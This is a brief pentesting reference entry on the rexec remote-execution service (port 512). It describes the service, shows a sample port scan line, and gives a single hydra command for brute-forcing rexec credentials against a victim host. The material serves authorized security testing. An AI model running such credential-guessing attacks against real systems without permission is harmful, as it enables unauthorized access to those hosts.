512 - Pentesting Rexec
Basic Information

It is a service that allows you to execute a command inside a host if you know valid credentials (username and password).

Default Port: 512

PORT    STATE SERVICE
512/tcp open  exec

hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
